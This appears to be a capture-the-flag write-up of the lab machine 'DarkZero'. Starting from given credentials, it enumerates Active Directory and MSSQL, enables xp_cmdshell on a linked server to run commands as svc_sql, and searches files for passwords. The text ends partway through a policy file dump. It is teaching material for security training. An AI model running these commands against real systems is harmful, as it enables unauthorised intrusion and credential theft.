
Target : 10.129.20.10 / 10.129.20.89

Date : 23/06/2026

`"As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!"` 

We start by testing the credentials while the `nmap scan` is ongoing :

```bash
>  nxc smb 10.129.20.10 -u john.w -p 'RFulUtONCOL!' --shares  
SMB         10.129.20.10    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.20.10    445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!    
SMB         10.129.20.10    445    DC01             [*] Enumerated shares  
SMB         10.129.20.10    445    DC01             Share           Permissions     Remark  
SMB         10.129.20.10    445    DC01             -----           -----------     ------  
SMB         10.129.20.10    445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.20.10    445    DC01             C$                              Default share  
SMB         10.129.20.10    445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.20.10    445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.20.10    445    DC01             SYSVOL          READ            Logon server share
```

```bash
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.20.10  
Please touch the FIDO authenticator.  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-23 12:17 +0200  
Nmap scan report for darkzero.htb (10.129.20.10)  
Host is up (0.074s latency).  
Not shown: 65517 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-23 10:18:16Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=DC01.darkzero.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb  
| Not valid before: 2026-06-23T10:00:26  
|_Not valid after:  2027-06-23T10:00:26  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=DC01.darkzero.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb  
| Not valid before: 2026-06-23T10:00:26  
|_Not valid after:  2027-06-23T10:00:26  
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM  
|_ssl-date: 2026-06-23T10:19:59+00:00; -3s from scanner time.  
| ms-sql-ntlm-info:    
|   10.129.20.10:1433:    
|     Target_Name: darkzero  
|     NetBIOS_Domain_Name: darkzero  
|     NetBIOS_Computer_Name: DC01  
|     DNS_Domain_Name: darkzero.htb  
|     DNS_Computer_Name: DC01.darkzero.htb  
|     DNS_Tree_Name: darkzero.htb  
|_    Product_Version: 10.0.26100  
| ms-sql-info:    
|   10.129.20.10:1433:    
|     Version:    
|       name: Microsoft SQL Server 2022 RTM  
|       number: 16.00.1000.00  
|       Product: Microsoft SQL Server 2022  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 1433  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-06-23T10:11:50  
|_Not valid after:  2056-06-23T10:11:50  
2179/tcp  open  vmrdp?  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=DC01.darkzero.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb  
| Not valid before: 2026-06-23T10:00:26  
|_Not valid after:  2027-06-23T10:00:26  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49672/tcp open  msrpc         Microsoft Windows RPC  
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49893/tcp open  msrpc         Microsoft Windows RPC  
49926/tcp open  msrpc         Microsoft Windows RPC  
57966/tcp open  msrpc         Microsoft Windows RPC  
63868/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022 (87%)  
OS CPE: cpe:/o:microsoft:windows_server_2022  
Aggressive OS guesses: Microsoft Windows Server 2022 (87%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: -3s, deviation: 0s, median: -3s  
| smb2-time:    
|   date: 2026-06-23T10:19:20  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 155.90 seconds
```

So we have `DNS 53/tcp` and `ms-sql-s 1433/tcp`, other than that, classic Active Directory ports open : `kerberos 88/tcp, LDAP 389/tcp msrpc 135/tcp, netBIOS 139/tcp, vmrdp 2179/tcp, smb 445/tcp` and `RPC over HTTP` as well as the DC name `DC01.darkzero.htb`.

```bash
>  echo "10.129.20.10 DC01.darkzero.htb darkzero.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.20.10 DC01.darkzero.htb darkzero.htb
```

We try `nxc` on the `mssql` :

```bash
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```

And it works.

We investigate mssql through netexec :

```bash
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d DC01.darkzero.htb -M mssql_priv  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] DC01.darkzero.htb\john.w:RFulUtONCOL!    
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d DC01.darkzero.htb -M enum_links  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] DC01.darkzero.htb\john.w:RFulUtONCOL!    
ENUM_LINKS  10.129.20.10    1433   DC01             [+] Linked servers found:  
ENUM_LINKS  10.129.20.10    1433   DC01             [*]   - DC01  
ENUM_LINKS  10.129.20.10    1433   DC01             [*]   - DC02.darkzero.ext
```

We found a linked server : `DC02.darkzero.ext`.

We continue to investigate :

```bash
>  echo "10.129.20.10 DC01.darkzero.htb darkzero.htb DC02.darkzero.ext" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.20.10 DC01.darkzero.htb darkzero.htb DC02.darkzero.ext  
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d DC01.darkzero.htb -M enum_impersonate  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] DC01.darkzero.htb\john.w:RFulUtONCOL!    
ENUM_IMP... 10.129.20.10    1433   DC01             [-] No users with impersonation rights found.
```

So we found a `linked server` on `ms-sql 1433/tcp`.

We'll check the user list with an `LDAP` search :

```bash
>  nxc ldap 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d DC01.darkzero.htb --users  
LDAP        10.129.20.10    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DC01.darkzero.htb) (signing:Enforced) (channel binding:When Supported)    
LDAP        10.129.20.10    389    DC01             [+] DC01.darkzero.htb\john.w:RFulUtONCOL!    
LDAP        10.129.20.10    389    DC01             [*] Enumerated 4 domain users: DC01.darkzero.htb  
LDAP        10.129.20.10    389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                  
LDAP        10.129.20.10    389    DC01             Administrator                 2025-09-10 18:42:44 0        Built-in account for administering the computer/domain         
LDAP        10.129.20.10    389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain       
LDAP        10.129.20.10    389    DC01             krbtgt                        2025-07-29 13:40:16 0        Key Distribution Center Service Account                        
LDAP        10.129.20.10    389    DC01             john.w                        2025-07-29 17:33:53 0
```

That doesn't give us much for an AD, maybe the `linked server` has more to offer.

We interact with it via `netexec mssql` :

```bash
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -q "SELECT name, product, data_source, is_linked, is_remote_login_enabled, is_rpc_out_enabled, is_data_access_enabled FROM sys.servers WHERE  
is_linked = 1"  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!    
MSSQL       10.129.20.10    1433   DC01             name:DC02.darkzero.ext  
MSSQL       10.129.20.10    1433   DC01             product:SQL Server  
MSSQL       10.129.20.10    1433   DC01             data_source:DC02.darkzero.ext  
MSSQL       10.129.20.10    1433   DC01             is_linked:True  
MSSQL       10.129.20.10    1433   DC01             is_remote_login_enabled:True  
MSSQL       10.129.20.10    1433   DC01             is_rpc_out_enabled:True  
MSSQL       10.129.20.10    1433   DC01             is_data_access_enabled:False
```

We try to `RCE` using `CMD` :

```bash
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -M exec_on_link -o LINKED_SERVER=DC02.darkzero.ext COMMAND=whoami  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!    
EXEC_ON_... 10.129.20.10    1433   DC01             [*] Command output: []  
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -M exec_on_link -o LINKED_SERVER=DC02.darkzero.ext COMMAND=id  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!    
EXEC_ON_... 10.129.20.10    1433   DC01             [*] Command output: []
```

But the "command output" is empty.

We enable `xp_cmdshell` :

```bash
>  nxc mssql 10.129.20.10 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -M link_enable_cmdshell -o LINKED_SERVER=DC02.darkzero.ext ACTION=enable  
  
MSSQL       10.129.20.10    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (EncryptionReq:False)  
MSSQL       10.129.20.10    1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!    
LINK_ENA... 10.129.20.10    1433   DC01             [*] Enabling xp_cmdshell on DC02.darkzero.ext. Current value: False  
LINK_ENA... 10.129.20.10    1433   DC01             [+] xp_cmdshell enabled on DC02.darkzero.ext
```

We then use `Impacket` :

```bash
>  PYTHONNOUSERSITE=1 mssqlclient.py -windows-auth 'darkzero.htb/john.w:RFulUtONCOL!@10.129.20.10'  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01): Line 1: Changed database context to 'master'.  
[*] INFO(DC01): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)  
[!] Press help for extra shell commands  
```

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];  
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

```SQL
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]  
output                    
--------------------      
darkzero-ext\svc_sql      
NULL
```

We are `svc_sql`.

```SQL
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''whoami /all''') AT [DC02.darkzero.ext]  
output                                                                                                                                                                              
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
NULL                                                                                                                                                                                
USER INFORMATION                                                                                                                                                                    
----------------                                                                                                                                                                    
NULL                                                                                                                                                                                
User Name            SID                                                                                                                                                            
==================== ============================================                                                                                                                   
darkzero-ext\svc_sql S-1-5-21-1969715525-31638512-2552845157-1103                                                                                                                   
NULL                                                                                                                                                                                
NULL                                                                                                                                                                                
GROUP INFORMATION                                                                                                                                                                   
-----------------                                                                                                                                                                   
NULL                                                                                                                                                                                
Group Name                                 Type             SID                                                             Attributes                                              
========================================== ================ =============================================================== ==================================================      
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group      
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group      
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group      
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group      
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group      
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group      
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group      
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group      
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner          
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group      
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group      
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                            
NULL                                                                                                                                                                                
NULL                                                                                                                                                                                
PRIVILEGES INFORMATION                                                                                                                                                              
----------------------                                                                                                                                                              
NULL                                                                                                                                                                                
Privilege Name                Description                    State                                                                                                                  
============================= ============================== ========                                                                                                               
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                
SeCreateGlobalPrivilege       Create global objects          Enabled                                                                                                                
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                                                                                               
NULL                                                                                                                                                                                
NULL                                                                                                                                                                                
USER CLAIMS INFORMATION                                                                                                                                                             
-----------------------                                                                                                                                                             
NULL                                                                                                                                                                                
User claims unknown.                                                                                                                                                                
NULL                                                                                                                                                                                
Kerberos support for Dynamic Access Control on this device has been disabled.                                                                                                       
NULL
```

and `EXEC ('xp_cmdshell ''cmd /c cd & dir''') AT [DC02.darkzero.ext]` puts us in a directory with `2042 File(s)` and `103 Dir(s)`.

We try to find stuff in that gigantic dir :

```SQL
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''cmd /c findstr /si /m password *.config *.ini *.xml 2>nul''') AT [DC02.darkzero.ext];  
output                                                                              
------------------------------------------------------------------------------      
DriverStore\FileRepository\prnms012.inf_amd64_885b8c3f72dc8a31\Amd64\MSIPP.xml      
icsxml\ipcfg.xml                                                                    
icsxml\pppcfg.xml                                                                   
schema.ini                                                                          
NULL
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''cmd /c dir C:\Users & dir C:\ /b''') AT [DC02.darkzero.ext];  
output                                                    
----------------------------------------------------      
Volume in drive C has no label.                          
Volume Serial Number is E415-87AD                        
NULL                                                      
Directory of C:\Users                                    
NULL                                                      
07/29/2025  03:23 PM    <DIR>          .                  
06/23/2026  10:19 AM    <DIR>          Administrator      
07/29/2025  12:58 PM    <DIR>          Public             
07/29/2025  03:23 PM    <DIR>          svc_sql            
              0 File(s)              0 bytes             
              4 Dir(s)   3,296,722,944 bytes free        
PerfLogs                                                  
Policy_Backup.inf                                         
Program Files                                             
Program Files (x86)                                       
Users                                                     
Windows                                                   
NULL
```

So we only have us, and the `Administrator` it seems, so we haven't found the `AD` user database.

We read the `Policy_Backup` :

```bash
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''cmd /c type C:\Policy_Backup.inf''') AT [DC02.darkzero.ext];  
output                                                                                                                                                                                                              
                                                  
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
---------------------------------------------      
[Unicode]                                                                                                                                                                                                           
                                                  
Unicode=yes                                                                                                                                                                                                         
                                                  
[System Access]                                                                                                                                                                                                     
                                                  
MinimumPasswordAge = 1                                                                                                                                                                                              
                                                  
MaximumPasswordAge = 42                                                                                                                                                                                             
                                                  
MinimumPasswordLength = 7                                                                                                                                                                                           
                                                  
PasswordComplexity = 1                                                                                                                                                                                              
                                                  
PasswordHistorySize = 24                                                                                                                                                                                            
                                                  
LockoutBadCount = 0                                                                                                                                                                                                 
                                                  
RequireLogonToChangePassword = 0                                                                                                                                                                                    
                                                  
ForceLogoffWhenHourExpire = 0                                                                                                                                                                                       
                                                  
NewAdministratorName = "Administrator"                                                                                                                                                                              
                                                  
NewGuestName = "Guest"                                                                                                                                                                                              
                                                  
ClearTextPassword = 0                                                                                                                                                                                               
                                                  
LSAAnonymousNameLookup = 0                                                                                                                                                                                          
                                                  
EnableAdminAccount = 1                                                                                                                                                                                              
                                                  
EnableGuestAccount = 0                                                                                                                                                                                              
                                                  
[Event Audit]                                                                                                                                                                                                       
                                                  
AuditSystemEvents = 0                                                                                                                                                                                               
                                                  
AuditLogonEvents = 0                                                                                                                                                                                                
                                                  
AuditObjectAccess = 0                                                                                                                                                                                               
                                                  
AuditPrivilegeUse = 0                                                                                                                                                                                               
                                                  
AuditPolicyChange = 0                                                                                                                                                                                               
                                                  
AuditAccountManage = 0                                                                                                                                                                                              
                                                  
AuditProcessTracking = 0                                                                                                                                                                                            
                                                  
AuditDSAccess = 0                                                                                                                                                                                                   
                                                  
AuditAccountLogon = 0                                                                                                                                                                                               
                                                  
[Kerberos Policy]                                                                                                                                                                                                   
                                                  
MaxTicketAge = 10                                                                                                                                                                                                   
                                                  
MaxRenewAge = 7                                                                                                                                                                                                     
                                                  
MaxServiceAge = 600                                                                                                                                                                                                 
                                                  
MaxClockSkew = 5                                                                                                                                                                                                    
                                                  
TicketValidateClient = 1                                                                                                                                                                                            
                                                  
[Registry Values]                                                                                                                                                                                                   
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole\SecurityLevel=4,0                                                                                                                        
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole\SetCommand=4,0                                                                                                                           
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount=1,"10"                                                                                                                              
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ForceUnlockLogon=4,0                                                                                                                                  
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\PasswordExpiryWarning=4,5                                                                                                                             
                                                  
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ScRemoveOption=1,"0"                                                                                                                                  
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin=4,5                                                                                                                    
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser=4,3                                                                                                                     
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCAD=4,0                                                                                                                                    
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName=4,0                                                                                                                       
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection=4,1                                                                                                                      
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA=4,1                                                                                                                                     
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths=4,1                                                                                                                          
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle=4,0                                                                                                                        
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization=4,1                                                                                                                          
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption=1,""                                                                                                                           
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText=7,                                                                                                                                
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop=4,1                                                                                                                         
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ScForceOption=4,0                                                                                                                                 
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ShutdownWithoutLogon=4,0                                                                                                                          
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\UndockWithoutLogon=4,1                                                                                                                            
                                                  
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures=4,0                                                                                                                   
                                                  
MACHINE\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\AuthenticodeEnabled=4,0                                                                                                                           
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\AuditBaseObjects=4,0                                                                                                                                                   
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\CrashOnAuditFail=4,0                                                                                                                                                   
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\DisableDomainCreds=4,0                                                                                                                                                 
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\EveryoneIncludesAnonymous=4,0                                                                                                                                          
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\FIPSAlgorithmPolicy\Enabled=4,0                                                                                                                                        
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\ForceGuest=4,0                                                                                                                                                         
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\FullPrivilegeAuditing=3,0                                                                                                                                              
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\LimitBlankPasswordUse=4,1                                                                                                                                              
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\NTLMMinClientSec=4,536870912                                                                                                                                    
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\NTLMMinServerSec=4,536870912                                                                                                                                    
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1                                                                                                                                                           
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymous=4,0                                                                                                                                                  
                                                  
MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymousSAM=4,1                                                                                                                                               
                                                  
MACHINE\System\CurrentControlSet\Control\Print\Providers\LanMan Print Services\Servers\AddPrinterDrivers=4,1                                                                                                        
                                                  
MACHINE\System\CurrentControlSet\Control\SecurePipeServers\Winreg\AllowedExactPaths\Machine=7,System\CurrentControlSet\Control\ProductOptions,System\CurrentControlSet\Control\Server Applications,Software\Micros  
oft\Windows NT\CurrentVersion                      
MACHINE\System\CurrentControlSet\Control\SecurePipeServers\Winreg\AllowedPaths\Machine=7,System\CurrentControlSet\Control\Print\Printers,System\CurrentControlSet\Services\Eventlog,Software\Microsoft\OLAP Server  
,Software\Microsoft\Windows NT\CurrentVersion      
\Print,Software\Microsoft\Windows NT\CurrentVersion\Windows,System\CurrentControlSet\Control\ContentIndex,System\CurrentControlSet\Control\Terminal Server,System\CurrentControlSet\Control\Terminal Server\UserCo  
nfig,System\CurrentControlSet\Control\Termina      
l Server\DefaultUserConfiguration,Software\Microsoft\Windows NT\CurrentVersion\Perflib,System\CurrentControlSet\Services\SysmonLog,SYSTEM\CurrentControlSet\Services\CertSvc                                        
                                                  
MACHINE\System\CurrentControlSet\Control\Session Manager\Kernel\ObCaseInsensitive=4,1                                                                                                                               
                                                  
MACHINE\System\CurrentControlSet\Control\Session Manager\Memory Management\ClearPageFileAtShutdown=4,0                                                                                                              
                                                  
MACHINE\System\CurrentControlSet\Control\Session Manager\ProtectionMode=4,1                                                                                                                                         
                                                  
MACHINE\System\CurrentControlSet\Control\Session Manager\SubSystems\optional=7,                                                                                                                                     
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\AutoDisconnect=4,15                                                                                                                               
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableForcedLogOff=4,1                                                                                                                            
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1                                                                                                                       
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\NullSessionPipes=7,,netlogon,samr,lsarpc                                                                                                          
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1                                                                                                                      
                                                  
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RestrictNullSessAccess=4,1                                                                                                                        
                                                  
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\EnablePlainTextPassword=4,0                                                                                                                  
                                                  
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\EnableSecuritySignature=4,1                                                                                                                  
                                                  
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\RequireSecuritySignature=4,0                                                                                                                 
                                                  
MACHINE\System\CurrentControlSet\Services\LDAP\LDAPClientIntegrity=4,1                                                                                                                                              
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,0                                                                                                                             
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\MaximumPasswordAge=4,30                                                                                                                               
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1                                                                                                                                 
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireStrongKey=4,1                                                                                                                                  
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\SealSecureChannel=4,1                                                                                                                                 
                                                  
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\SignSecureChannel=4,1                                                                                                                                 
                                                  
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1                                                                                                                                   
                                                  
[Privilege Rights]                                                                                                                                                                                                  
                                                  
SeNetworkLogonRight = *S-1-1-0,*S-1-5-11,*S-1-5-32-544,*S-1-5-32-554,*S-1-5-9                                                                                                                                       
                                                  
SeMachineAccountPrivilege = *S-1-5-11                                                                                                                                                                               
                                                  
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551                                                                                                                                                       
                                                  
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-11,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-32-554,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968  
-1052248003                                        
SeSystemtimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549                                                                                                                                                       
                                                  
SeCreatePagefilePrivilege = *S-1-5-32-544                                                                                                                                                                           
                                                  
SeDebugPrivilege = *S-1-5-32-544                                                                                                                                                                                    
                                                  
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549                                                                                                                                                             
                                                  
SeAuditPrivilege = *S-1-5-19,*S-1-5-20                                                                                                                                                                              
                                                  
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003                       
                                                  
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0                                                                                                                                                         
                                                  
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550                                                                                                                                                                 
                                                  
SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559                                                                                                                                                       
                                                  
SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,*S-1-5-80-0,*S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107  
430,*S-1-5-80-3880718306-3832830129-167785921      
4-2598158968-1052248003                                                                                                                                                                                             
                                                  
SeInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-32-551,*S-1-5-9                                                                                                            
                                                  
SeSecurityPrivilege = *S-1-5-32-544                                                                                                                                                                                 
